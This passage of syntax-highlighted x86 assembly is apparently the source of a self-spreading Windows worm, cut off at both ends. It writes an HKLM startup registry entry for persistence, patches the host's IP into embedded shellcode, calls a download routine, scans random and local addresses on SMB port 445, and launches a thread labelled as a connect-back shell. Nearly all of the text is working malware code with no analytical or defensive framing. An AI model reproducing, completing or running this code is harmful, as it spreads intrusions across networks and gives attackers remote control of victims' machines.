    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetLastError</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ERROR_ALREADY_EXISTS</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc2">.1st</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc2">.1st</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WSADATA</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">;[ebp - 4]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WSAStartup</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetVersion</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OSVERSION</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">CS_LOOP</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InitializeCriticalSection</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">CS_THREADNUM</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InitializeCriticalSection</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">THREADNUM</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">        </span><span class="sc1">;phkResult</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">KEY_WRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">szStartupKey</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">HKEY_LOCAL_MACHINE</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateMutex</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MTX_CBACK</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegOpenKeyEx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">.reg1</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">;lstrlen</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">WSADATA_LEN</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetModuleFileName</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrlen</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">REG_SZ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">szStartupValue</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegSetValueEx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc0">

</span><span class="sc5">.reg1</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">@FileServer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateThread</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">



</span><span class="sc5">.NotConn</span><span class="sc0">                </span><span class="sc1">;Primary Thread loop</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">TIMEOUT</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InternetGetConnectedState</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">.NotConn</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CONNECTED</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;TRUE</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@InitShellcode</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@Download</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc5">SCAN_THREADS</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lpLocalIPs</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@GetLocalIPs</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OSVERSION</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sets</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SCAN_THREADS</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwLocalIPs</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">.CreateScanThreads</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">WSADATA</span><span class="sc0">        </span><span class="sc1">;lpThreadID</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">;dwCreationFlags</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">.Nip</span><span class="sc0">

    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">.Nip</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;lpParameter (local IPs)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">@Scan</span><span class="sc0">      </span><span class="sc1">;lpStartRoutine</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">.scan</span><span class="sc0">

</span><span class="sc5">.cback</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">@Cback</span><span class="sc0">     </span><span class="sc1">;Cback shell thread</span><span class="sc0">
</span><span class="sc5">.scan</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateThread</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">.CreateScanThreads</span><span class="sc0">

</span><span class="sc5">.Conn</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">TIMEOUT</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InternetGetConnectedState</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">.Conn</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CONNECTED</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;FALSE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.NotConn</span><span class="sc0">



</span><span class="sc5">@InitShellcode</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc5">IPPROTO_UDP</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc5">SOCK_DGRAM</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">socket</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0xBECF3752</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0x11220002</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">connect</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getsockname</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc2">.1</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WSADATA</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">;gethostbyname</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">WSADATA_LEN</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gethostname</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gethostbyname</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc2">.1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc2">.1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc2">.1</span><span class="sc0">
</span><span class="sc1">;SHELLCODE IP</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SHELLCODE_XORIP</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">shellcode</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SHELLCODE_IP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">closesocket</span><span class="sc0">

    </span><span class="sc6">leave</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;ARGS:  edi = DWORD array</span><span class="sc0">
</span><span class="sc1">;   ecx = array items</span><span class="sc0">
</span><span class="sc5">@GetLocalIPs</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gethostbyname</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">.end</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;h_addr_list</span><span class="sc0">

</span><span class="sc2">.1</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">.end</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">127</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc2">.2</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">.l1</span><span class="sc0">

</span><span class="sc2">.2</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">.l1</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc2">.1</span><span class="sc0">

</span><span class="sc5">.end</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwLocalIPs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">.ret</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">




</span><span class="sc1">;ARG1:  IP address or 0</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@Scan</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc9">%xdefine</span><span class="sc0">     </span><span class="sc5">_445OPEN</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">0x4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc9">%xdefine</span><span class="sc0">     </span><span class="sc5">NUM_IPDUP</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">0x8</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">    </span><span class="sc1">;sin.zero</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">    </span><span class="sc1">;ip</span><span class="sc0">

                </span><span class="sc9">%xdefine</span><span class="sc0">     </span><span class="sc5">IP_4</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">0x11</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;class D</span><span class="sc0">
                </span><span class="sc9">%xdefine</span><span class="sc0">     </span><span class="sc5">IP_3</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">0x12</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;class C</span><span class="sc0">
                </span><span class="sc9">%xdefine</span><span class="sc0">     </span><span class="sc5">IP_2</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">0x13</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;class B</span><span class="sc0">
                </span><span class="sc9">%xdefine</span><span class="sc0">     </span><span class="sc5">IP</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">0x14</span><span class="sc4">]</span><span class="sc0">


    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc4">|</span><span class="sc0"> </span><span class="sc4">((((</span><span class="sc2">445</span><span class="sc0"> </span><span class="sc4">&lt;&lt;</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">&amp;</span><span class="sc0"> </span><span class="sc2">0xFF00</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">|</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc2">445</span><span class="sc0"> </span><span class="sc4">&gt;&gt;</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">&amp;</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc4">))</span><span class="sc0"> </span><span class="sc4">&lt;&lt;</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc9">%xdefine</span><span class="sc0">     </span><span class="sc5">SIN</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">0x18</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc0">
                </span><span class="sc9">%xdefine</span><span class="sc0">     </span><span class="sc5">RAND_SEED</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">0x1C</span><span class="sc4">]</span><span class="sc0">
